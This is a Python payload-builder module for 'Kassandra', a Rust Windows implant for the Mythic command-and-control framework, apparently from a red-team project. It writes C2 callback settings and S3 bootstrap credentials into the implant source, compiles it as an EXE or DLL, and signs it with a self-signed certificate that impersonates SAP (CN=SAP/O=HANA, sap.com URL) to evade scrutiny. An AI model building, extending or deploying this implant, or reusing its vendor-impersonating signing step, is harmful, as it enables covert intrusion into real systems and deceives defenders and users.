import pathlib
from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import json
import asyncio
import os
import shutil
import base64
import subprocess

class KassandraAgent(PayloadType):
    name = "Kassandra"                                                     # Agent Name
    file_extension = "exe"                                            # Default file extension
    author = "@PatchRequest"                                          # Author
    supported_os = [SupportedOS.Windows]                              # OS Handled
    wrapper = False                                                   # If we want to use a wrapper like scarescrow
    wrapped_payloads = []                                             # If wrapper, list of wrapper payloads to use
    note = """Basic Implant in Rust"""                                   # Description
    supports_dynamic_loading = False                                  # Support of dynamic code loading
    c2_profiles = ["http", "s3_storage"]                              # Listener types
    c2_parameter_deviations = {
        "s3_storage": {
            "encrypted_exchange_check": C2ParameterDeviation(supported=False),
        }
    }
    mythic_encrypts = False                                           # is the encryption handled by Mythic
    translation_container = "KassandraTranslator"                          # Translator service name
    build_parameters = [
        BuildParameter(
            name="output",
            parameter_type=BuildParameterType.ChooseOne,
            description="Choose output format",
            choices=["exe", "dll"],
            default_value="exe"
        ),
        BuildParameter(
            name="chunk_size",
            parameter_type=BuildParameterType.String,
            description="Chunk size in bytes for upload/download",
            default_value="4096"
        )
    ]                                             # Array if we want custom parameters during build
    agent_path = pathlib.Path(".") / "Kassandra"                           # Path of Kassandra
    agent_icon_path = agent_path / "agent_functions" / "Kassandra.svg"     # Path of the icon
    agent_code_path = agent_path / "agent_code"                       # Path of the agent source code

    build_steps = [                                                   # Build steps
        BuildStep(step_name="Gathering Files", step_description="Making sure all commands have backing files on disk"),
        BuildStep(step_name="Provisioning C2", step_description="Setting up C2 credentials"),
        BuildStep(step_name="Applying configuration", step_description="Stamping in configuration values"),
        BuildStep(step_name="Compiling", step_description="Compiling the agent")
    ]

    async def build(self) -> BuildResponse:
        # this function gets called to create an instance of your payload
        resp = BuildResponse(status=BuildStatus.Success)
        Config = {
            "payload_uuid": self.uuid,
            "callback_host": "",
            "USER_AGENT": "Mozilla/5.0 MythicAgent",
            "httpMethod": "POST",
            "post_uri": "",
            "headers": [],
            "callback_port": 80,
            "ssl":False,
            "proxyEnabled": False,
            "proxy_host": "",
            "proxy_user": "",
            "proxy_pass": "",
        }

        # S3 config (populated if s3_storage C2 profile is selected)
        s3_config = None
        use_s3 = False
        enc_key = None

        stdout_err = ""
        for c2 in self.c2info:
            profile = c2.get_c2profile()
            profile_name = profile["name"]

            if profile_name == "s3_storage":
                use_s3 = True
                params = c2.get_parameters_dict()
                killdate = params.get("killdate", None)
                Config["callback_interval"] = params.get("callback_interval", "5")
                Config["callback_jitter"] = params.get("callback_jitter", "10")

                # Handle AESPSK parameter
                aespsk_param = params.get("AESPSK", None)
                enc_key = None
                if isinstance(aespsk_param, dict):
                    if aespsk_param.get("value") == "aes256_hmac":
                        enc_key = aespsk_param.get("enc_key", None)
                elif isinstance(aespsk_param, str) and aespsk_param not in ("none", ""):
                    enc_key = aespsk_param

                # Call s3_storage generate_config RPC to provision bootstrap credentials
                config_data = await SendMythicRPCOtherServiceRPC(MythicRPCOtherServiceRPCMessage(
                    ServiceName="s3_storage",
                    ServiceRPCFunction="generate_config",
                    ServiceRPCFunctionArguments={
                        "payload_uuid": self.uuid,
                        "killdate": killdate,
                        "enc_key": enc_key,
                    }
                ))

                if not config_data.Success:
                    resp.status = BuildStatus.Error
                    resp.build_stderr = f"S3 provisioning failed: {config_data.Error}"
                    return resp

                s3_config = config_data.Result

            elif profile_name == "http":
                for key, val in c2.get_parameters_dict().items():
                    if isinstance(val, dict) and 'enc_key' in val:
                        stdout_err += "Setting {} to {}".format(key, val["enc_key"] if val["enc_key"] is not None else "")
                        encKey = base64.b64decode(val["enc_key"]) if val["enc_key"] is not None else ""
                    else:
                        Config[key] = val
            break

        if not use_s3:
            if "https://" in Config["callback_host"]:
                Config["ssl"] = True
            Config["callback_host"] = Config["callback_host"].replace("https://", "").replace("http://","")
            if Config["proxy_host"] != "":
                Config["proxyEnabled"] = True

        # create the payload
        await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="Gathering Files",
                StepStdout="Found all files for payload",
                StepSuccess=True
            ))

        # Report C2 provisioning
        if use_s3 and s3_config:
            key_preview = s3_config["access_key_id"][:8] + "..."
            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="Provisioning C2",
                StepStdout=(
                    f"S3 Storage C2 provisioned\n"
                    f"Bucket: {s3_config['bucket']}\n"
                    f"Payload Prefix: {s3_config['payload_prefix']}/\n"
                    f"Region: {s3_config['region']}\n"
                    f"Bootstrap Key: {key_preview}\n"
                    f"Encryption: {'AES-256-CBC + HMAC-SHA256 (EKE)' if enc_key else 'disabled'}\n"
                    f"Mode: Runtime per-execution IAM provisioning\n"
                    f"Bootstrap Permissions: PUT .req, GET/DELETE .creds (register/ only)"
                ),
                StepSuccess=True,
            ))
        else:
            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="Provisioning C2",
                StepStdout="HTTP C2 - no additional provisioning needed",
                StepSuccess=True,
            ))

        # Build in-place to reuse cached target/ artifacts across builds.
        # Only config.rs changes between builds — stamp it, build, restore.
        kassandra_dir = (pathlib.Path(self.agent_code_path) / "kassandra").resolve()
        config_path = kassandra_dir / "src" / "config.rs"
        cargo_path = kassandra_dir / "Cargo.toml"
        src_path = kassandra_dir / "src"

        # Save originals for restoration after build
        config_original = config_path.read_text()
        cargo_original = cargo_path.read_text()

        # Files we may temporarily hide for EXE vs DLL builds
        main_rs = src_path / "main.rs"
        lib_rs = src_path / "lib.rs"
        main_hidden = src_path / "main.rs.bak"
        lib_hidden = src_path / "lib.rs.bak"

        try:
            # Stamp config.rs with build-specific values
            content = config_original
            content = content.replace("%UUID%", Config["payload_uuid"])
            content = content.replace("%HOSTNAME%", Config.get("callback_host", ""))
            content = content.replace("%ENDPOINT%", Config.get("post_uri", ""))
            content = content.replace("%PORT%", str(Config.get("callback_port", "80")))
            content = content.replace("%USERAGENT%", Config.get("USER_AGENT", ""))
            content = content.replace("%PROXYURL%", Config.get("proxy_host", ""))
            content = content.replace("%SLEEPTIME%", str(Config.get("callback_interval", "5")))
            content = content.replace("%JITTER%", str(Config.get("callback_jitter", "10")))
            content = content.replace("%CHUNKSIZE%", str(self.get_parameter("chunk_size")))
            content = content.replace("%SSL%", "true" if Config.get("ssl") else "false")
            content = content.replace("%PROXYENABLED%", "true" if Config.get("proxyEnabled") else "false")

            # S3 config stamping
            if use_s3 and s3_config:
                content = content.replace("%USE_S3%", "true")
                content = content.replace("%S3_ENDPOINT%", s3_config["s3_endpoint"])
                content = content.replace("%S3_BUCKET%", s3_config["bucket"])
                content = content.replace("%S3_PAYLOAD_PREFIX%", s3_config["payload_prefix"])
                content = content.replace("%S3_BOOTSTRAP_ACCESS_KEY_ID%", s3_config["access_key_id"])
                content = content.replace("%S3_BOOTSTRAP_SECRET_ACCESS_KEY%", s3_config["secret_access_key"])
                content = content.replace("%S3_REGION%", s3_config["region"])
                content = content.replace("%AESPSK%", enc_key if enc_key else "")
            else:
                content = content.replace("%USE_S3%", "false")
                content = content.replace("%S3_ENDPOINT%", "")
                content = content.replace("%S3_BUCKET%", "")
                content = content.replace("%S3_PAYLOAD_PREFIX%", "")
                content = content.replace("%S3_BOOTSTRAP_ACCESS_KEY_ID%", "")
                content = content.replace("%S3_BOOTSTRAP_SECRET_ACCESS_KEY%", "")
                content = content.replace("%S3_REGION%", "")
                content = content.replace("%AESPSK%", "")

            config_path.write_text(content)

            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="Applying configuration",
                StepStdout="All configuration setting applied",
                StepSuccess=True
            ))

            output_format = self.get_parameter("output")

            # Temporarily hide the unused entry point and adjust Cargo.toml
            if output_format == "dll":
                if main_rs.exists():
                    main_rs.rename(main_hidden)
                with open(cargo_path, "a") as f:
                    f.write('\n[lib]\ncrate-type = ["cdylib"]\npath = "src/lib.rs"\n')
            else:
                if lib_rs.exists():
                    lib_rs.rename(lib_hidden)

            manifest = f"--manifest-path {cargo_path}"
            target = "--target x86_64-pc-windows-gnu"
            toolchain = "+nightly-2025-04-30"

            # --- cargo build ---
            num_jobs = os.cpu_count() or 4
            if output_format == "dll":
                build_command = f"cargo {toolchain} build --release --lib -j {num_jobs} {target} {manifest}"
                filename = str(kassandra_dir / "target" / "x86_64-pc-windows-gnu" / "release" / "kassandra.dll")
            else:
                build_command = f"cargo {toolchain} build --release -j {num_jobs} {target} {manifest}"
                filename = str(kassandra_dir / "target" / "x86_64-pc-windows-gnu" / "release" / "kassandra.exe")

            proc = await asyncio.create_subprocess_shell(
                build_command,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, stderr = await proc.communicate()
            stdout_str = stdout.decode(errors="replace")
            stderr_str = stderr.decode(errors="replace")

            if proc.returncode != 0:
                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                    PayloadUUID=self.uuid,
                    StepName="Compiling",
                    StepStdout=f"Compilation failed:\n{stderr_str}",
                    StepSuccess=False
                ))
                resp.status = BuildStatus.Error
                resp.build_message = stderr_str
                return resp

            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="Compiling",
                StepStdout=f"Successfully compiled Kassandra\n{stderr_str}",
                StepSuccess=True
            ))

            pfx_path = "/opt/codesign.pfx"
            if not os.path.exists(pfx_path):
                pfx_path = generate_self_signed_cert()
            if output_format == "dll":
                newName = filename.replace("kassandra.dll", "kassandraSigned.dll")
            else:
                newName = filename.replace("kassandra.exe", "kassandraSigned.exe")
            sign_with_osslsigncode(filename, newName, pfx_path, "infected")

            resp.payload = open(newName, "rb").read()
            return resp

        finally:
            # Always restore original source files so the next build starts clean
            config_path.write_text(config_original)
            cargo_path.write_text(cargo_original)
            if main_hidden.exists():
                main_hidden.rename(main_rs)
            if lib_hidden.exists():
                lib_hidden.rename(lib_rs)



def generate_self_signed_cert(name="mycodecert", password="infected"):
    # Paths
    key = f"{name}.key"
    crt = f"{name}.crt"
    pfx = f"{name}.pfx"

    # Generate private key
    subprocess.run(["openssl", "genrsa", "-out", key, "2048"], check=True)

    # Generate self-signed certificate
    subprocess.run([
        "openssl", "req", "-new", "-x509",
        "-key", key,
        "-out", crt,
        "-days", "3650",
        "-subj", "/CN=SAP/O=HANA"
    ], check=True)

    # Convert to .pfx
    subprocess.run([
        "openssl", "pkcs12", "-export",
        "-out", pfx,
        "-inkey", key,
        "-in", crt,
        "-passout", f"pass:{password}"
    ], check=True)

    return pfx

def sign_with_osslsigncode(input_exe, output_exe, cert_pfx, pfx_pass):
    subprocess.run([
        "osslsigncode", "sign",
        "-pkcs12", cert_pfx,
        "-pass", pfx_pass,
        "-n", "Kassandra",
        "-i", "https://www.sap.com/germany/index.html",
        "-t", "http://timestamp.digicert.com",
        "-in", input_exe,
        "-out", output_exe
    ], check=True)
